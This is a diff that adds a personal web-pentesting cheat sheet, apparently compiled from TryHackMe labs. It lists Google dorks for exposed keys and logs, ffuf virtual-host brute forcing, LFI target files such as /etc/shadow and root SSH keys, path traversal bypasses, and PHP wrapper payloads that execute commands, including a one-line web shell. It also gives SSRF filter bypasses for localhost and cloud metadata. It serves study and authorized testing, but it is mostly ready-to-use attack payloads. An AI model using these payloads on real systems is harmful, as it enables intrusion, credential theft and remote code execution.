@@ -1,0 +1,235 @@
+=================RECON==========================
+        --Sensitive Filetypes--
+
+pdf
+doc
+docx
+ppt
+pptx
+xls
+xlsx
+       --Bit of Dorking--
+
+intitle:"index of" "nginx.log"
+intitle:"index of" "contacts.txt"
+inurl:/certs/server.key
+intitle:"GlassFish Server - Server Running"
+intitle:"index of" "*.php"
+intitle:"index of" "*.log"
+intext:"user name" intext:"orion core" -solarwinds.com
+intitle:"index of" errors.log
+
+        --Subdomain Enumeration--
+
+http://crt.sh/
+https://ui.ctsearch.entrust.com/ui/ctsearchui
+-site:www.tryhackme.com  site:*.tryhackme.com
+https://github.com/aboul3la/Sublist3r
+DnsRecon -- GITHUB
+
+Brute Forcing for Virtual Hosts:
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.29.238
+
+Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the -fs switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.29.238 -fs {size}
+
+
+
+==============================Buisness Logic==============================
+
+If something like mail address or anything else going in the query string in POST request, [/customers/reset?email=robert%40acmeitsupport.thm]
+Then add the same as parameter and give another value for example your mail and check if you get the mail.
+
+==============================Content Discovery==============================
+
+                  To Know Framework Stack
+
+Run the following command on the AttackBox, it will download the favicon and get its md5 hash value which you can then lookup on the:
+
+https://wiki.owasp.org/index.php/OWASP_favicon_database
+
+kali:
+
+curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+
+Windows:
+
+curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico -UseBasicParsing -o favicon.ico
+
+Get-FileHash .\favicon.ico -Algorithm MD5 
+
+An amazing AUTOMATION for this:
+
+https://github.com/devanshbatham/FavFreak
+
+                   
+                     S3 Buckets
+
+http(s)://{name}.s3.amazonaws.com
+
+{name}-assets
+{name}-www
+{name}-public
+{name}-private
+
+
+=============================File Inclusion============================
+
+Check For These Files: 
+
+/etc/issue
+C:\boot.ini
+/var/log/apache2/access.log
+/var/log/apache2
+/access.log
+C:\boot.ini
+/root/.ssh/id_rsa
+/var/mail/root
+/var/log/dmessage
+/root/.bash_history
+/etc/shadow
+/etc/passwd
+/proc/version
+/etc/profile
+
+
+Use this if server is appendin any extension [.php, .pdf, .jpeg, etc] in last of the file:
+
+%00
+0x00
+
+NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.
+
+So use this:
+
+/.
+
+To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that's because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.
+
+
+                        Bypasses
+
+....//....//....//....//....//etc/passwd
+
+For this:
+http://webapp.thm/index.php?lang=languages/EN.php
+
+Do this:
+?lang=languages/../../../../../etc/passwd
+
+
+-------------------Remote File Inclusion----------------------
+
+One requirement for RFI is that the allow_url_fopen option needs to be on.
+
+---------------------PHP File Wrappers------------------------
+
+                         Php: //
+
+Base64:
+php://filter/convert.base64-encode/resource = < file >
+
+Rot13: [This only applies to some type of files only, like etc/hosts]
+php://filter/read=string.rot13/resource=filename
+
+
+                        data://
+
+Plain-Text:
+data:text/plain,%3C?php echo shell_exec("id")?%3E
+
+Base64:
+data://text/ plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA / Pgo = & cmd = id
+
+
+                      php: // input
+
+curl -s -X POST --data "<?php system('id'); ?>" "http://example.com/index.php?file=php://input"
+
+This wrapper only works if the option allow_url_includeThe option equivalent to a Remote File Inclusion ( is activated in the PHP configuration).
+
+
+                 Note: Installed By Deafult
+
+                       expect://
+
+expect: // < command >
+
+This occurs because this wrapper gives access to a PTY ( pseudo-teletype ), which on UNIX basically refers to a terminal. Gives access to both STDIN, STDOUT and STDERR.
+
+
+			zip://
+
+
+zip://evil.zip%23shell.php&cmd=ls
+
+First make a zip [evil.zip], now make shell.php with harmful php code and move it inside evil.zip
+
+PHP CODE:
+
+<?php system($_GET['cmd']); ?>
+
+
+sudo apt install phpX.Y-zip
+
+The wrapper zip allows us to run a php that we have put inside a zip file. Even the zip file does not need to have a zip extension, but can have any one.
+
+Refrence: https://deephacking.tech/php-wrappers-pentesting-web/
+
+
+==================================SSRF=====================================
+
+Use this to stop appending anything after your server url, like .jpeg, .php, etc:
+
+&x=
+
+Add this at the end of your url.
+
+
+Use this as burp collaborator:
+requestbin.com 
+
+
+                              Bypasses 
+
+If localhost and 127.0.0.1 is denied to access
+
+
+0
+0.0.0.0
+0000
+127.1
+127.*.*.*
+2130706433
+017700000001
+
+Or Subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as:
+
+127.0.0.1.nip.io
+
+Also, in a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254, which contains metadata for the deployed cloud server, including possibly sensitive information. An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254
+
+
+If the above bypasses do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor gets automatically redirected to another website address. Take, for example, the link https://website.thm/link?url=https://tryhackme.com. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine there was a potential SSRF vulnerability with stringent rules which only allowed URLs beginning with https://website.thm/. An attacker could utilise the above feature to redirect the internal HTTP request to a domain of the attacker's choice.
+
+If /private isn't allowed try this:
+
+x/../private
+
+
+===========================================Command Injection===========================================
+
+https://github.com/payloadbox/command-injection-payload-list
+
+
+
+
+
+
+
+
+
+
+
